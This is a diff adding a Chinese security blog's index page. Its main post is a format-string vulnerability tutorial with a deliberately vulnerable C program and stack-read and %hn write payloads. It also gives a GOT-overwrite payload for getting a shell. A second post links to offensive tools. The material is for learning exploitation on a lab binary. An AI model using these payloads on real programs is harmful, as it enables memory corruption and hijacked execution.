@@ -1,0 +1,2420 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                <!--history.back();-->
+                window.location.href='https://kevien.github.io';
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, M0rk,blog,security,hack" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:title" content="M0rk's Blog">
+<meta property="og:url" content="http://kevien.github.io/index.html">
+<meta property="og:site_name" content="M0rk's Blog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="M0rk's Blog">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://kevien.github.io/"/>
+
+
+
+
+
+  <title> M0rk's Blog -  </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+   page-home 
+ ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">M0rk's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/04/07/格式化字符串漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/07/格式化字符串漏洞/" itemprop="url">
+                  格式化字符串漏洞
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-07T05:37:24+08:00">
+                2018-04-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>不同于bufferoverflow，格式化字符串漏洞是另外一种漏洞类型，这两天学习了一下，仅当笔记备忘。</li>
+<li>在了解格式化字符串漏洞之前还是应该先了解一下printf函数的基本功能。可以使用命令 man 3 printf 查看printf函数的功能介绍，其中printf是c语言中为数不多的支持可变参数的库函数。根据cdecl的函数调用规定，函数的从最右边的参数开始，逐个压栈。如果要传入的是一个字符串，那么就将字符串的指针压栈。这一切都井井有条的进行着。如果是一般的函数，函数的调用者和被调用者都应该知道函数的参数个数以及每个参数的类型。但是对于像printf这种可变参数的函数来说，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。</li>
+<li>测试环境ubuntuX86<h4 id="任意内存读取"><a href="#任意内存读取" class="headerlink" title="任意内存读取"></a>任意内存读取</h4></li>
+<li>如果我们无意或者有意，在format中，或者说我们要求printf打印的数据数量大于我们所给的数量会怎样？printf函数不可能知道栈帧中哪一些数据是它传入参数，哪些是属于函数调用者的数据。</li>
+<li><p>vuln code</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char *argv[]) &#123;</div><div class="line">   char text[1024];</div><div class="line">   static int test_val = -72;</div><div class="line"></div><div class="line">   if(argc &lt; 2) &#123;</div><div class="line">      printf(&quot;Usage: %s &lt;text to print&gt;\n&quot;, argv[0]);</div><div class="line">      exit(0);</div><div class="line">   &#125;</div><div class="line">   strcpy(text, argv[1]);</div><div class="line"></div><div class="line">   printf(&quot;The right way to print user-controlled input:\n&quot;);</div><div class="line">   printf(&quot;%s&quot;, text);</div><div class="line"></div><div class="line"></div><div class="line">   printf(&quot;\nThe wrong way to print user-controlled input:\n&quot;);</div><div class="line">   printf(text);</div><div class="line"></div><div class="line">   printf(&quot;\n&quot;);</div><div class="line"></div><div class="line">   // Debug output</div><div class="line">   printf(&quot;[*] test_val @ 0x%08x = %d 0x%08x\n&quot;, &amp;test_val, test_val, test_val);</div><div class="line"></div><div class="line">   exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>当我们输入 AAAA%08x.%08x.%08x.%08x可以看到我们读取到了保存于栈中的数据（输入的AAAA），当然如果输入的%08x更多还会读取到栈中更多的数据<br><img src="/2018/04/07/格式化字符串漏洞/memread.png" alt=""></p>
+</li>
+<li>如果写入的AAAA是一个敏感的地址呢，比如指向敏感字符串的地址。<br><img src="/2018/04/07/格式化字符串漏洞/readspecifyadd.png" alt=""><h4 id="任意内存写入"><a href="#任意内存写入" class="headerlink" title="任意内存写入"></a>任意内存写入</h4></li>
+<li>任意内存写入需要用到%n这个不常用的参数，它的功能是将%n之前printf已经打印的字符个数赋值给传入的指针,通过%n我们就可以修改内存中的值了。还是原来的漏洞代码。</li>
+<li><p>此外还需要$的配合，如下的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">printf(&quot;7th: %7$d, 4th: %4$05d\n&quot;, 10, 20, 30, 40, 50, 60, 70, 80);</div></pre></td></tr></table></figure>
+</li>
+<li><p>会打印输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">7th: 70, 4th: 00040</div></pre></td></tr></table></figure>
+</li>
+<li><p>即%7$d 获取的将是参数列表中第7个元素的值，%4$05d 获取的是第四个参数的值，且需要有效位长度是5</p>
+</li>
+<li>例如下面的输入  $(printf “\x30\xa0\x04\x08\x32\xa0\x04\x08”)%43699x%4\$hn%8738x%5\$hn 会将test_val地址的值修改为0xccddaabb<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ gdb -q </div><div class="line">gdb-peda$ p/h 0xaabb - 8</div><div class="line">Size letters are meaningless in &quot;print&quot; command.</div><div class="line">gdb-peda$ p/d 0xaabb - 8</div><div class="line">$1 = 43699</div><div class="line">gdb-peda$ p/d 0xccdd - 0xaabb</div><div class="line">$2 = 8738</div><div class="line">gdb-peda$ quit</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ ./fmt_vuln  123</div><div class="line">The right way to print user-controlled input:</div><div class="line">123</div><div class="line">The wrong way to print user-controlled input:</div><div class="line">123</div><div class="line">[*] test_val @ 0x0804a030 = -72 0xffffffb8</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ ./fmt_vuln  $(printf &quot;\x30\xa0\x04\x08\x32\xa0\x04\x08&quot;)%43699x%4\$hn%8738x%5\$hn</div><div class="line">The right way to print user-controlled input:</div><div class="line">0�2�%43699x%4$hn%8738x%5$hn</div><div class="line">The wrong way to print user-controlled input:</div><div class="line">0�2� ...</div><div class="line">[*] test_val @ 0x0804a030 = -857888069 0xccddaabb</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="覆盖GOT表"><a href="#覆盖GOT表" class="headerlink" title="覆盖GOT表"></a>覆盖GOT表</h4><ul>
+<li>可能会有人问能不能通过这种漏洞来getshell呢，答案是可以的，而且方法不止一种，下面介绍一种相对来说简单且常用的方法，通过覆盖GOT表方法来getshell的trick，总体的思路就是程序最后要执行exit函数，我们覆盖exit函数的地址为shellcode的地址来达到getshell的目的。</li>
+<li>我们知道一个程序可以使用共享库，那么它必然有一个存放了各个函数对应的地址的表，这个表就是PLT(procedure linkage table)。</li>
+<li><p>使用objdump 查看plt section</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ objdump -d -j .plt ./fmt_vuln</div><div class="line"></div><div class="line">./fmt_vuln:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .plt:</div><div class="line"></div><div class="line">08048360 &lt;printf@plt-0x10&gt;:</div><div class="line"> 8048360:	ff 35 04 a0 04 08    	pushl  0x804a004</div><div class="line"> 8048366:	ff 25 08 a0 04 08    	jmp    *0x804a008</div><div class="line"> 804836c:	00 00                	add    %al,(%eax)</div><div class="line">	...</div><div class="line"></div><div class="line">08048370 &lt;printf@plt&gt;:</div><div class="line"> 8048370:	ff 25 0c a0 04 08    	jmp    *0x804a00c</div><div class="line"> 8048376:	68 00 00 00 00       	push   $0x0</div><div class="line"> 804837b:	e9 e0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">08048380 &lt;strcpy@plt&gt;:</div><div class="line"> 8048380:	ff 25 10 a0 04 08    	jmp    *0x804a010</div><div class="line"> 8048386:	68 08 00 00 00       	push   $0x8</div><div class="line"> 804838b:	e9 d0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">08048390 &lt;puts@plt&gt;:</div><div class="line"> 8048390:	ff 25 14 a0 04 08    	jmp    *0x804a014</div><div class="line"> 8048396:	68 10 00 00 00       	push   $0x10</div><div class="line"> 804839b:	e9 c0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483a0 &lt;__gmon_start__@plt&gt;:</div><div class="line"> 80483a0:	ff 25 18 a0 04 08    	jmp    *0x804a018</div><div class="line"> 80483a6:	68 18 00 00 00       	push   $0x18</div><div class="line"> 80483ab:	e9 b0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483b0 &lt;exit@plt&gt;:</div><div class="line"> 80483b0:	ff 25 1c a0 04 08    	jmp    *0x804a01c</div><div class="line"> 80483b6:	68 20 00 00 00       	push   $0x20</div><div class="line"> 80483bb:	e9 a0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483c0 &lt;__libc_start_main@plt&gt;:</div><div class="line"> 80483c0:	ff 25 20 a0 04 08    	jmp    *0x804a020</div><div class="line"> 80483c6:	68 28 00 00 00       	push   $0x28</div><div class="line"> 80483cb:	e9 90 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483d0 &lt;putchar@plt&gt;:</div><div class="line"> 80483d0:	ff 25 24 a0 04 08    	jmp    *0x804a024</div><div class="line"> 80483d6:	68 30 00 00 00       	push   $0x30</div><div class="line"> 80483db:	e9 80 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div></pre></td></tr></table></figure>
+</li>
+<li><p>如上所示可以看到exit函数的相关跳转，但是这个plt section是READONLY即只读不可修改的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ objdump -h ./fmt_vuln | grep -A1 &quot;\ .plt\ &quot;</div><div class="line"> 11 .plt          00000080  08048360  08048360  00000360  2**4</div><div class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</div></pre></td></tr></table></figure>
+</li>
+<li><p>但如果仔细看的话，可以知道jmp    *0x804a01c 中的jmp地址并不是一个直接的地址，而是一个指针指向的地址，即exit函数的地址是存放在地址0x804a01c处的。</p>
+</li>
+<li>这些个地址是存在放另外的section的，叫做global offset table(GOT),它是可写的。然后通过objdump可以获取的到。<br><img src="/2018/04/07/格式化字符串漏洞/objgot.png" alt=""> </li>
+<li>如上说明exit函数是在0x0804a01c这个地址上的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./fmt_vuln $(printf &quot;\x1e\xa0\x04\x08\x1c\xa0\x04\x08&quot;)%49143x%4\$hn%12981x%5\$hn</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/04/07/格式化字符串漏洞/shell1.png" alt=""><br><img src="/2018/04/07/格式化字符串漏洞/shell2.png" alt=""></p>
+<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><ul>
+<li>这里就主要过程做了说明，想要真正理解还需要自己动手去实践。<br><a href="https://github.com/kevien/exploitcode/tree/master/formatstringexp" target="_blank" rel="external">gitrepo</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
+<li>《Hacking the art of exploitation》0x352</li>
+<li>漏洞挖掘基础之格式化字符串<br><a href="http://drops.xmd5.com/static/drops/papers-9426.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/papers-9426.html</a></li>
+<li>格式化字符串漏洞简介<br><a href="http://drops.xmd5.com/static/drops/binary-7714.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/binary-7714.html</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/04/02/20180402安全动态/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/02/20180402安全动态/" itemprop="url">
+                  20180402安全动态
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-02T10:26:28+08:00">
+                2018-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <ul>
+<li>使用 strace 调试管道与套接字之间的通信<br><a href="https://github.com/nh2/strace-pipes-presentation/blob/master/presentation/Debugging%20across%20pipes%20and%20sockets%20with%20strace.pdf" target="_blank" rel="external">https://github.com/nh2/strace-pipes-presentation/blob/master/presentation/Debugging%20across%20pipes%20and%20sockets%20with%20strace.pdf</a></li>
+<li>如何编译、分析和调试基于 MIPS 架构的二进制文件<br><a href="https://www.ringzerolabs.com/2018/03/the-wonderful-world-of-mips.html" target="_blank" rel="external">https://www.ringzerolabs.com/2018/03/the-wonderful-world-of-mips.html</a></li>
+<li>使用JTAG从设备内存中提取密码<br><a href="https://labs.portcullis.co.uk/blog/jtag-on-chip-debugging-extracting-passwords-from-memory/" target="_blank" rel="external">https://labs.portcullis.co.uk/blog/jtag-on-chip-debugging-extracting-passwords-from-memory/</a></li>
+<li>如何在 Linux 中内存执行 ELF 二进制文件<br><a href="https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html" target="_blank" rel="external">https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html</a></li>
+<li>探索 CobaltStrike 的 ExternalC2 框架<br><a href="https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/" target="_blank" rel="external">https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/</a></li>
+<li>udtrace - 用于捕获 Unix 域套接字的 LD_PRELOAD 库<br><a href="http://laforge.gnumonks.org/blog/20180330-udtrace/" target="_blank" rel="external">http://laforge.gnumonks.org/blog/20180330-udtrace/</a></li>
+<li>sRDI - 用于反射式 DLL 注入的 Shellcode 构造与加载工具<br><a href="https://github.com/ohjeongwook/sRDI" target="_blank" rel="external">https://github.com/ohjeongwook/sRDI</a></li>
+<li>bleah - 用于攻击智能设备的 BLE 扫描器<br><a href="https://github.com/evilsocket/bleah" target="_blank" rel="external">https://github.com/evilsocket/bleah</a></li>
+<li>Windows下的密码hash——Net-NTLMv1介绍<br><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/</a></li>
+<li>关于利用rundll32执行程序的分析<br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8rundll32%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8rundll32%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90/</a></li>
+<li>容器镜像安全概述<br><a href="http://blog.nsfocus.net/docker-mirror-security/" target="_blank" rel="external">http://blog.nsfocus.net/docker-mirror-security/</a></li>
+<li>利用恶意页面攻击本地Xdebug<br><a href="https://xlab.tencent.com/cn/2018/03/30/pwn-local-xdebug/" target="_blank" rel="external">https://xlab.tencent.com/cn/2018/03/30/pwn-local-xdebug/</a></li>
+<li>汇编语言入门教程<br><a href="https://mp.weixin.qq.com/s/HdiXqmQWvvvkhlIwMFzcvQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/HdiXqmQWvvvkhlIwMFzcvQ</a></li>
+<li>绕过 ASLR+NX Part 1<br><a href="http://intx0x80.blogspot.com/2018/04/bypass-aslrnx-part-1.html" target="_blank" rel="external">http://intx0x80.blogspot.com/2018/04/bypass-aslrnx-part-1.html</a></li>
+<li>DNS 解析器性能比较：CloudFlare / Google / Quad9 / OpenDNS<br><a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#x68;&#116;&#116;&#x70;&#x73;&#x3a;&#47;&#47;&#x6d;&#x65;&#x64;&#105;&#x75;&#109;&#x2e;&#x63;&#111;&#x6d;&#47;&#64;&#110;&#x79;&#x6b;&#x6f;&#x6c;&#97;&#115;&#x2e;&#122;&#x2f;&#100;&#x6e;&#x73;&#x2d;&#x72;&#x65;&#115;&#111;&#x6c;&#x76;&#x65;&#114;&#115;&#x2d;&#112;&#101;&#114;&#x66;&#x6f;&#114;&#109;&#97;&#110;&#x63;&#x65;&#45;&#99;&#111;&#x6d;&#112;&#x61;&#114;&#101;&#x64;&#45;&#99;&#x6c;&#111;&#x75;&#100;&#x66;&#108;&#x61;&#x72;&#101;&#45;&#x78;&#45;&#103;&#111;&#111;&#x67;&#108;&#x65;&#45;&#x78;&#x2d;&#x71;&#x75;&#97;&#100;&#x39;&#x2d;&#120;&#x2d;&#111;&#112;&#x65;&#110;&#x64;&#110;&#x73;&#45;&#49;&#x34;&#57;&#x65;&#x38;&#x30;&#x33;&#x37;&#x33;&#52;&#101;&#x35;">&#x68;&#116;&#116;&#x70;&#x73;&#x3a;&#47;&#47;&#x6d;&#x65;&#x64;&#105;&#x75;&#109;&#x2e;&#x63;&#111;&#x6d;&#47;&#64;&#110;&#x79;&#x6b;&#x6f;&#x6c;&#97;&#115;&#x2e;&#122;&#x2f;&#100;&#x6e;&#x73;&#x2d;&#x72;&#x65;&#115;&#111;&#x6c;&#x76;&#x65;&#114;&#115;&#x2d;&#112;&#101;&#114;&#x66;&#x6f;&#114;&#109;&#97;&#110;&#x63;&#x65;&#45;&#99;&#111;&#x6d;&#112;&#x61;&#114;&#101;&#x64;&#45;&#99;&#x6c;&#111;&#x75;&#100;&#x66;&#108;&#x61;&#x72;&#101;&#45;&#x78;&#45;&#103;&#111;&#111;&#x67;&#108;&#x65;&#45;&#x78;&#x2d;&#x71;&#x75;&#97;&#100;&#x39;&#x2d;&#120;&#x2d;&#111;&#112;&#x65;&#110;&#x64;&#110;&#x73;&#45;&#49;&#x34;&#57;&#x65;&#x38;&#x30;&#x33;&#x37;&#x33;&#52;&#101;&#x35;</a></li>
+<li>whonow - 用于执行 DNS Rebinding 攻击的恶意 DNS 服务器<br><a href="https://github.com/brannondorsey/whonow" target="_blank" rel="external">https://github.com/brannondorsey/whonow</a></li>
+<li>Exim Off-by-one(CVE-2018-6789)漏洞复现分析<br><a href="https://paper.seebug.org/557/" target="_blank" rel="external">https://paper.seebug.org/557/</a></li>
+<li>「驭龙」Linux执行命令监控驱动实现解析<br><a href="https://mp.weixin.qq.com/s?__biz=MzI4MzI4MDg1NA==&amp;mid=2247483953&amp;idx=1&amp;sn=1c34aba130041bc6f4c6afdaf19eb1c7&amp;chksm=eb8c5688dcfbdf9eb69dcdfb852a1f54b2d6cd02b813dcd8986dbf6731be12dfe22e95b5550e&amp;mpshare=1&amp;scene=23&amp;srcid=0403lA8vkaQA3osZ2bKRIZ4a%23rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzI4MzI4MDg1NA==&amp;mid=2247483953&amp;idx=1&amp;sn=1c34aba130041bc6f4c6afdaf19eb1c7&amp;chksm=eb8c5688dcfbdf9eb69dcdfb852a1f54b2d6cd02b813dcd8986dbf6731be12dfe22e95b5550e&amp;mpshare=1&amp;scene=23&amp;srcid=0403lA8vkaQA3osZ2bKRIZ4a%23rd</a></li>
+<li>使用内存取证技术寻找 Meterpreter 的踪迹<br><a href="https://articles.forensicfocus.com/2018/04/03/finding-metasploits-meterpreter-traces-with-memory-forensics/" target="_blank" rel="external">https://articles.forensicfocus.com/2018/04/03/finding-metasploits-meterpreter-traces-with-memory-forensics/</a></li>
+<li>滥用组策略对象 GPO 攻击活动目录的方法介绍<br><a href="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" target="_blank" rel="external">https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e</a></li>
+<li>逆向基础之 ESP 定律<br><a href="https://goggleheadedhacker.com/blog/post/6" target="_blank" rel="external">https://goggleheadedhacker.com/blog/post/6</a></li>
+<li>gef -  GDB 功能增强工具<br><a href="https://github.com/hugsy/gef" target="_blank" rel="external">https://github.com/hugsy/gef</a></li>
